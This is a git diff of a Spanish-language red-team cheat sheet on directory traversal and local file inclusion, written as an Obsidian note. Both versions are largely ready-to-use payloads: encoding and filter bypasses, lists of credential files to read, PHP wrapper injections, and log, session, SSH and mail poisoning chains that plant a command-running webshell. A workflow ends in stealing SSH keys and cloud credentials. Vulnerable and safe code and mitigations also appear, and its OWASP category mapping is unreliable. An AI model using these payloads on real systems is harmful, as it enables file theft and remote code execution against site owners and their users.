@@ -1,288 +1,374 @@
 ---
 aliases:
   - Path Traversal
-  - Dot-Dot-Slash
-  - LFI Traversal
+  - Directory Traversal
+  - Dot Dot Slash
+  - ../ Attack
 tags:
-  - type/atomic
+  - type/vulnerability
   - vuln/path-traversal
+  - vuln/lfi
   - technique/initial-access
-  - technique/discovery
+  - technique/credential-access
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación|Explotación]]'
 tertiary categories:
-  - "[[Web Enumeration]]"
-type: Atomic
+  - '[[Explotación Web]]'
+type: CheatSheet
 linked:
-  - "[[gobuster]]"
-  - "[[ffuf]]"
-  - "[[Burp Suite]]"
+  - '[[Directory Traversal - Deteccion y Reconocimiento]]'
+  - '[[Directory Traversal - Payloads Basicos]]'
+  - '[[Directory Traversal - Bypass de Sanitizacion]]'
+  - '[[Directory Traversal - Vectores OS y Stack]]'
+  - '[[Directory Traversal - Chains y Variantes]]'
+  - '[[Directory Traversal - Tooling]]'
+  - '[[File Inclusion]]'
+  - '[[Insecure Deserialization]]'
+  - '[[Burp Suite]]'
 ---
 # Directory Traversal
 
 ***
 
 ## Cheatsheet
-^directory-traversal
 
-| Vector | Payload |
-| --- | --- |
-| **Basic** | `../../../etc/passwd` |
-| **Absolute** | `/etc/passwd` |
-| **URL encode** | `..%2f..%2f..%2fetc%2fpasswd` |
-| **Double encode** | `..%252f..%252fetc%252fpasswd` |
-| **16-bit unicode** | `..%u2215..%u2215etc%u2215passwd` |
-| **UTF-8 overlong** | `..%c0%af..%c0%afetc%c0%afpasswd` |
-| **Null byte** (PHP <5.3) | `../../../etc/passwd%00` |
-| **Filter bypass** | `....//....//etc/passwd` |
-| **Strip-prefix bypass** | `/var/www/images/../../../etc/passwd` |
-| **Windows** | `..\..\..\windows\win.ini` |
-| **PHP wrapper read** | `php://filter/convert.base64-encode/resource=index.php` |
+### 🔍 Detección y Reconocimiento
 
-***
+````tabs
+tab: **Identificar Endpoints**
+![[Directory Traversal - Deteccion y Reconocimiento#^pt-detect-params]]
 
-## Concepto
+tab: **Probes Iniciales**
+![[Directory Traversal - Deteccion y Reconocimiento#^pt-detect-probes]]
 
-Vuln donde input del user termina en operación de file access sin sanitización, permitiendo **leer (y a veces escribir) archivos fuera del directorio web**. Root cause típico: concatenación directa de user input en `fopen`/`file_get_contents`/`include`/etc.
+tab: **Detectar OS y Stack**
+![[Directory Traversal - Deteccion y Reconocimiento#^pt-detect-os]]
+````
 
-Path Traversal ≠ LFI:
-- **Path Traversal**: lectura arbitraria de archivos.
-- **LFI (Local File Inclusion)**: el archivo se **ejecuta/interpreta** (PHP `include`) → RCE vía log poisoning, PHP wrappers, session file, etc.
+### 🎯 Payloads Básicos
 
-## 1. Discovery
+````tabs
+tab: **Unix `../` Traversal**
+![[Directory Traversal - Payloads Basicos#^pt-payload-unix]]
+
+tab: **Windows `..\\` Traversal**
+![[Directory Traversal - Payloads Basicos#^pt-payload-windows]]
+
+tab: **Mixed Encoding**
+![[Directory Traversal - Payloads Basicos#^pt-payload-mixed]]
+
+tab: **Absolute Paths**
+![[Directory Traversal - Payloads Basicos#^pt-payload-absolute]]
+````
+
+### 🔓 Bypass de Sanitización
+
+````tabs
+tab: **URL Encoding Variants**
+![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-encoding]]
+
+tab: **Null Byte Truncation**
+![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-nullbyte]]
+
+tab: **Path Normalization**
+![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-normalization]]
+
+tab: **Filter Strip Evasion**
+![[Directory Traversal - Bypass de Sanitizacion#^pt-bypass-strip]]
+````
+
+### 💉 Vectores por OS / Stack
+
+````tabs
+tab: **Linux Objetivos**
+![[Directory Traversal - Vectores OS y Stack#^pt-stack-linux]]
+
+tab: **Windows Objetivos**
+![[Directory Traversal - Vectores OS y Stack#^pt-stack-windows]]
+
+tab: **PHP Wrappers**
+![[Directory Traversal - Vectores OS y Stack#^pt-stack-php-wrappers]]
+
+tab: **Java Path Handling**
+![[Directory Traversal - Vectores OS y Stack#^pt-stack-java]]
+
+tab: **Node.js / Express**
+![[Directory Traversal - Vectores OS y Stack#^pt-stack-node]]
+````
+
+### 🔗 Chains y Variantes
+
+````tabs
+tab: **LFI to RCE Chain**
+![[Directory Traversal - Chains y Variantes#^pt-chain-lfi-rce]]
+
+tab: **Path Traversal en Upload**
+![[Directory Traversal - Chains y Variantes#^pt-chain-upload]]
+
+tab: **ZIP Slip / Tar Slip**
+![[Directory Traversal - Chains y Variantes#^pt-chain-zipslip]]
+
+tab: **Symlink Abuse**
+![[Directory Traversal - Chains y Variantes#^pt-chain-symlink]]
+
+tab: **ImageMagick / File Processors**
+![[Directory Traversal - Chains y Variantes#^pt-chain-image]]
+````
+
+### 🛠️ Tooling
+
+````tabs
+tab: **dotdotpwn**
+![[Directory Traversal - Tooling#^pt-tool-dotdotpwn]]
+
+tab: **LFISuite**
+![[Directory Traversal - Tooling#^pt-tool-lfisuite]]
+
+tab: **Burp Intruder + Wordlists**
+![[Directory Traversal - Tooling#^pt-tool-burp]]
+
+tab: **Wordlists Recomendadas**
+![[Directory Traversal - Tooling#^pt-tool-wordlists]]
+
+tab: **Custom Scripts**
+![[Directory Traversal - Tooling#^pt-tool-custom]]
+````
+
+___
+
+## Overview
+
+**Directory Traversal** (también **Path Traversal**, **`../` Attack**) = atacante manipula path proveído al backend para acceder archivos fuera del directorio intencionado. Backend concatena user input con path base (`/var/www/uploads/${filename}`) sin sanitización → atacante usa `../` para subir directorios y leer archivos sensibles del filesystem.
+
+OWASP Top 10 — A05 (2021) Security Misconfiguration / A04 (2017) XML External Entities. Vector frecuente con high impact: file disclosure (`/etc/passwd`, `/etc/shadow`, app configs), credentials theft, chain a LFI → RCE.
+
+### Diferencia con LFI / RFI
+
+| | **Path Traversal** | **LFI** | **RFI** |
+|---|---|---|---|
+| Scope | Lectura archivos fuera de scope | Inclusión de archivos local | Inclusión de archivos remoto |
+| Mecanismo | Concatenación path | `include()`, `require()` PHP | `include()` con URL remota |
+| Impacto | File disclosure | File disclosure + RCE (si exec) | RCE direct |
+| Lenguaje agnóstico | ✓ (todos) | PHP-specific (mostly) | PHP-specific |
+| Resultado | Bytes del file | Code execution si interpretable | Code execution direct |
+
+Path Traversal es vector **agnóstico al lenguaje** — afecta cualquier app que concatene paths. LFI es subset PHP-specific cuando file leído también se ejecuta.
+
+___
+
+## Workflow de explotación
+
+```
+1. Identificar endpoint con file param:
+   - ?file= ?path= ?include= ?image= ?download=
+   - Body POST con file field
+   - Path segment /file/X.txt
+
+2. Probe básico:
+   - ../etc/passwd → Linux probe
+   - ..\\windows\\win.ini → Windows probe
+   - /etc/passwd → absolute (no traversal)
+
+3. Si bloqueado, escalar bypasses:
+   a. URL encoding (single/double/UTF-8 overlong).
+   b. Null byte truncation %00.
+   c. Filter strip bypass (....//).
+   d. Path normalization differences.
+   e. ;..\/ Tomcat-style.
+
+4. Identificar OS:
+   - Linux → /etc/passwd, /proc/self/environ
+   - Windows → win.ini, web.config
+   - Stack via headers (X-Powered-By, Server)
+
+5. Decidir explotación:
+   a. Pure file disclosure → leer config / secrets.
+   b. PHP wrappers (php://filter, data://, expect://) → RCE.
+   c. Log poisoning + LFI → RCE chain.
+   d. Upload + traversal → webshell drop.
+   e. Archive extraction (ZIP slip) → file write.
+   f. Symlink abuse → race conditions.
+
+6. Escalation:
+   - Read source code via php://filter/base64.
+   - Steal SSH keys / AWS creds / app secrets.
+   - Pivot to other vulns (LFI to RCE, webshell).
+```
+
+___
+
+## Detección rápida
+
+### Indicadores en código backend
+
+```php
+// PHP — VULN
+<?php
+include($_GET['page'] . '.php');  // ← LFI directo
+readfile($_GET['file']);          // ← File disclosure
+?>
+
+// PHP — SAFE
+$allowed = ['home', 'about', 'contact'];
+$page = in_array($_GET['page'], $allowed) ? $_GET['page'] : 'home';
+include($page . '.php');
+```
+
+```python
+# Python — VULN
+def serve_file(filename):
+    with open('/var/www/uploads/' + filename) as f:  # ← traversal
+        return f.read()
+
+# Python — SAFE
+import os
+def serve_file(filename):
+    base = '/var/www/uploads/'
+    full = os.path.realpath(os.path.join(base, filename))
+    if not full.startswith(base):
+        raise ValueError('Path traversal detected')
+    with open(full) as f:
+        return f.read()
+```
+
+```javascript
+// Node.js — VULN
+app.get('/file', (req, res) => {
+    res.sendFile('/var/www/uploads/' + req.query.name);  // ← traversal
+});
+
+// Node.js — SAFE
+const path = require('path');
+app.get('/file', (req, res) => {
+    const base = '/var/www/uploads';
+    const full = path.resolve(base, req.query.name);
+    if (!full.startsWith(base + path.sep)) {
+        return res.status(403).send('Forbidden');
+    }
+    res.sendFile(full);
+});
+```
+
+### Probes mínimos
 
 ```bash
-# Fuzzing con payloads de traversal
-ffuf -u "http://target/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+# 1. Linux probe
+curl 'https://target/api/file?path=../../../etc/passwd'
 
-# Detectar parámetros que manejan archivos
-ffuf -u "http://target/page?FUZZ=index.html" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline>
+# 2. Windows probe
+curl 'https://target/api/file?path=../../../windows/win.ini'
 
-# Burp Intruder con lista de payloads (PayloadsAllTheThings)
+# 3. Bypasses
+curl 'https://target/api/file?path=..%2f..%2f..%2fetc%2fpasswd'
+curl 'https://target/api/file?path=....//....//....//etc/passwd'
+curl 'https://target/api/file?path=..%c0%afetc%c0%afpasswd'
+
+# 4. PHP wrapper
+curl 'https://target/api/file?path=php://filter/convert.base64-encode/resource=index.php'
+
+# 5. Auto-tooling
+dotdotpwn.pl -m http -h target.com -f /etc/passwd -k 'root:'
 ```
 
-Indicadores:
-- Parámetro con nombre sugestivo: `file`, `page`, `include`, `doc`, `path`, `src`, `download`, `view`, `theme`.
-- Error messages tipo `Failed to open stream: No such file or directory in /var/www/html/...`.
-- Content-type changes si sirve contenido literal vs interpretado.
+___
 
-## 2. Bypass filters
+## Impacto
 
-### String filter `../`
+- **File disclosure** — `/etc/passwd`, `/etc/shadow`, app configs (`.env`, `web.config`).
+- **Credential theft** — DB passwords, API keys, AWS creds, SSH keys.
+- **Source code disclosure** — via `php://filter/base64-encode`.
+- **LFI to RCE** — log poisoning, session poisoning, Phar deserialization.
+- **Information disclosure** — internal paths, software versions, server config.
+- **Persistence** — webshell drop via upload + traversal.
+- **Privesc local** — symlink TOCTOU abuse.
+- **Container escape** — read host files via mounted paths.
+- **DoS** — read special files (`/dev/zero`, `/dev/random`).
 
-```
-....//....//....//etc/passwd       # strip-once fails
-..././..././..././etc/passwd
-```
+___
 
-### Encoding chains
+## Mitigación (defender)
 
-```
-# Single URL-encode
-..%2F..%2F..%2Fetc%2Fpasswd
+- **NO concatenar input directo en path** — usar whitelist de archivos permitidos:
+  ```python
+  ALLOWED = {'home.html', 'about.html', 'contact.html'}
+  if filename in ALLOWED:
+      return open('/views/' + filename).read()
+  ```
+- **Canonicalize + verify** — resolver path completo + verificar que esté dentro del base:
+  ```python
+  full = os.path.realpath(os.path.join(base, filename))
+  if not full.startswith(base + os.sep):
+      raise ValueError('Forbidden')
+  ```
+- **Use IDs en lugar de paths** — `?file=<UUID>` y mapear a path real en backend.
+- **Sandbox el process** — chroot, container, AppArmor / SELinux.
+- **Filesystem permissions** — separar webserver UID de file owners.
+- **Disable PHP wrappers peligrosos**:
+  ```ini
+  ; php.ini
+  allow_url_include = Off
+  allow_url_fopen = Off
+  ; Disable expect
+  disable_functions = exec, system, passthru, ...
+  ```
+- **Disable PHP `include` con user input** — auditar code.
+- **Web server config** — `Options -Indexes -FollowSymLinks` (Apache).
+- **WAF rules** — ModSecurity OWASP CRS detecta `../` patterns.
+- **Input validation type-strict** — accept solo alphanumeric en filenames.
+- **Logging + alerting** — suspicious paths en logs.
+- **Updated software** — newer versions patch null byte issues.
 
-# Double URL-encode (engine decodes twice)
-..%252F..%252Fetc%252Fpasswd
+___
 
-# UTF-8 overlong (IIS / old Apache)
-..%c0%af..%c0%afetc%c0%afpasswd
+## Para entender Path Traversal
 
-# Unicode fullwidth
-..%uff0f..%uff0fetc%uff0fpasswd
-```
+**Por qué `../` es tan poderoso:**
 
-### Absolute path (when app prepends base dir)
+Filesystem tree es estructura jerárquica. Cada directorio tiene `..` (parent) implícito en Unix/Windows. `../` significa "subir un nivel". Concatenado N veces, atacante alcanza root: `/var/www/uploads/../../../../etc/passwd` → `/etc/passwd`.
 
-```
-# App: $file = "/var/www/uploads/" . $_GET['f']
-# Bypass con null byte o extensión fake:
-?f=/etc/passwd%00.jpg            # PHP <5.3
-?f=/etc/passwd%23.jpg            # # truncates
+OS resuelve path antes de open. Backend ve string `../../...etc/passwd`, OS resuelve y abre `/etc/passwd`. Filtros que solo bloquean `../` son insuficientes — encoding y normalización differentials los bypasean.
 
-# Linux: /proc shortcut
-?f=/proc/self/environ
-?f=/proc/self/cmdline
-?f=/proc/self/status
-?f=/proc/self/fd/0     # stdin
-```
+**Por qué bypasses son tan complejos:**
 
-### Suffix append bypass
+Filter en backend implementa subset de path resolution. OS implementa full path resolution. Diferencia entre ambos = vector. Atacante explota:
+- Filter remueve `../` literalmente, OS resuelve `....//` como `../`.
+- Filter normaliza a lowercase, OS sí pero filesystem es case-sensitive en Linux.
+- Filter strips null byte, OS truncates en NUL byte.
+- Filter checks at HTTP layer, OS sees decoded path después.
 
-```
-# App: $file = $_GET['f'] . ".php"
-# Bypass: null byte (legacy PHP)
-?f=../../etc/passwd%00
+Cada layer (proxy, app server, language runtime, OS) puede normalizar diferente. Bug surge en differentials.
 
-# Bypass: path truncation (PHP ~4096 chars)
-?f=../../etc/passwd/./././././... (4000x)
+**Diferencia entre Path Traversal y file:// SSRF:**
 
-# Bypass: query string
-?f=../../etc/passwd?
-```
+- Path Traversal: explota concatenación de path local.
+- SSRF con `file://`: explota fetch URL backend, donde `file://` es esquema permitido.
 
-## 3. Archivos interesantes (Linux)
+Ambos resultan en file read pero vector distinto.
 
-```
-/etc/passwd
-/etc/shadow              # needs root
-/etc/hostname
-/etc/hosts
-/etc/issue
-/etc/resolv.conf
-/etc/crontab
-/etc/apache2/apache2.conf
-/etc/nginx/nginx.conf
-/etc/ssh/sshd_config
-/var/log/apache2/access.log
-/var/log/auth.log
-/var/www/html/config.php
-/home/<user>/.ssh/id_rsa
-/home/<user>/.bash_history
-/root/.ssh/id_rsa
-/proc/self/environ       # env vars (posible RCE via log poisoning)
-/proc/self/cmdline
-/proc/<pid>/cmdline
-/proc/version
-/proc/mounts
-```
+**Por qué LFI to RCE es tan común en PHP:**
 
-## 4. Archivos interesantes (Windows)
+PHP `include()` ejecuta el archivo como código PHP. Si atacante puede:
+1. Forzar app a hacer `include($user_input . '.php')`.
+2. Inyectar PHP code en algún archivo (log, session, upload).
+3. Path traverse al archivo poisoned.
 
-```
-C:\Windows\win.ini
-C:\boot.ini
-C:\Windows\System32\drivers\etc\hosts
-C:\Windows\System32\config\SAM
-C:\Windows\System32\config\SYSTEM
-C:\Windows\repair\SAM
-C:\inetpub\wwwroot\web.config
-C:\xampp\apache\conf\httpd.conf
-C:\Users\<user>\.ssh\id_rsa
-C:\Users\<user>\NTUSER.DAT
-```
+Result: `<?php system($_GET['c']); ?>` ejecuta. Stack PHP es notable por este chain.
 
-## 5. PHP wrappers (LFI → source leak / RCE)
-
-```
-# Leer source PHP codificado base64 (evita que se ejecute)
-?file=php://filter/convert.base64-encode/resource=index.php
-
-# Encadenar filtros
-?file=php://filter/read=string.rot13/resource=index.php
-?file=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
-
-# Injectar código via data://
-?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
-
-# expect:// (si módulo expect instalado)
-?file=expect://id
-
-# Input stream (POST body as PHP)
-POST /page?file=php://input
-Body: <?php system('id'); ?>
-
-# Phar deserialization (PHP 7+)
-?file=phar:///tmp/exploit.phar
-```
-
-## 6. LFI → RCE chains
-
-### Log poisoning
-
-```bash
-# 1. Injectar PHP en log vía User-Agent
-curl http://target/ -H "User-Agent: <?php system(\$_GET['c']); ?>"
-
-# 2. Incluir log
-http://target/page.php?file=/var/log/apache2/access.log&c=id
-```
-
-### Session file
-
-```bash
-# 1. Settear valor en sesión que incluya PHP
-curl http://target/login -d "username=<?php system(\$_GET['c']); ?>"
-
-# 2. Incluir sesión
-# /var/lib/php/sessions/sess_<PHPSESSID>
-?file=/var/lib/php/sessions/sess_abcd1234&c=id
-```
-
-### /proc/self/environ (CGI)
-
-```bash
-# User-Agent escribe en environ
-curl http://target -H "User-Agent: <?php system('id'); ?>"
-
-# LFI para ejecutarlo
-?file=/proc/self/environ
-```
-
-### SSH auth_log
-
-```bash
-# 1. Auth SSH con usuario tipo <?php system($_GET['c']); ?>
-ssh '<?php system($_GET["c"]); ?>'@target
-
-# 2. Include /var/log/auth.log
-?file=/var/log/auth.log&c=id
-```
-
-### Mail log
-
-```bash
-# Enviar mail con PHP en body
-echo "<?php system(\$_GET['c']); ?>" | mail -s subject www-data@target
-
-# Include /var/mail/www-data
-?file=/var/mail/www-data&c=id
-```
-
-## 7. Wordlists
-
-```
-/usr/share/seclists/Fuzzing/LFI/
-├── LFI-Jhaddix.txt
-├── LFI-gracefulsecurity-linux.txt
-├── LFI-gracefulsecurity-windows.txt
-└── LFI-LFISuite-pathtotest-huge.txt
-
-/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
-```
-
-## 8. Tools
-
-| Tool | Uso |
-| --- | --- |
-| **LFISuite** | Auto-LFI + shell spawn (outdated pero útil). |
-| **liffy** | Similar a LFISuite, más actualizado. |
-| **fuxploider** | File upload + LFI chains. |
-| **Burp Intruder** | Payload lists custom. |
-| **ffuf / wfuzz** | Fuzzing rápido con filters. |
-
-## 9. Write-primitive (escritura)
-
-Ciertos bugs permiten **escribir** arbitrario (mv/copy/extract con path input):
-- **Zip Slip** — `zip -r evil.zip "../../etc/cron.d/pwn"` → víctima extrae → cron overwrite.
-- **Tar Slip** — análogo con tar symlinks.
-- **File upload** — controlar nombre con traversal: `uploads/../../../tmp/shell.php`.
-
-## 10. Prevención
-
-- **Canonicalizar** path + verificar prefijo: `realpath($input)` y `strpos($real, $base) === 0`.
-- **Whitelist** de filenames (no blacklist de `../`).
-- **Chroot** o containers para aislar.
-- **Disable wrappers peligrosos** en PHP: `allow_url_include = Off`, desabilitar `expect`, `phar`.
-- **File permissions**: www-data no debe leer `/etc/shadow`, `.ssh/`, etc.
+___
 
 ## Recursos
 
-- [PortSwigger - Path traversal](https://portswigger.net/web-security/file-path-traversal)
-- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
-- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
-- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [PortSwigger - Directory Traversal](https://portswigger.net/web-security/file-path-traversal) — labs.
+- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) — payloads.
+- [HackTricks - File Inclusion / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion) — referencia.
+- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) — overview.
+- [dotdotpwn](https://github.com/wireghoul/dotdotpwn) — Perl fuzzer.
+- [LFISuite](https://github.com/D35m0nd142/LFISuite) — auto-exploit.
+- [CWE-22 - Path Traversal](https://cwe.mitre.org/data/definitions/22.html) — MITRE.
+- [Snyk - ZIP Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability) — paper original.
+- [Orange Tsai - URL Parser Inconsistencies](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) — paper.
 
 ***
